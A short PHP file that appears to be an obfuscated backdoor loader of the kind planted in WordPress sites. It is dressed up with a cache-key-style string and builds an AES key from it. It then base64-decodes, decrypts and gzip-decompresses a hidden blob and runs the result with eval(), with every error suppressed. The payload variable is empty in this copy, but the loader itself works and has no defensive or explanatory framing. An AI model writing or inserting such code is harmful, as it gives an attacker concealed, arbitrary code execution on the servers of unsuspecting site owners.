<?php
$k=hash("sha256","wp_cache_key_2024_secure_encryption_key_v1",true);
$d='';
if($d){
	$r=@base64_decode($d,true);
	if($r!==false){
		$i=substr($r,0,16);
		$e=substr($r,16);
		$c=@openssl_decrypt($e,"AES-256-CBC",$k,1,$i);
		if($c!==false){
			$u=@gzdecode($c);
			if($u!==false)eval($u);
		}
	}
}

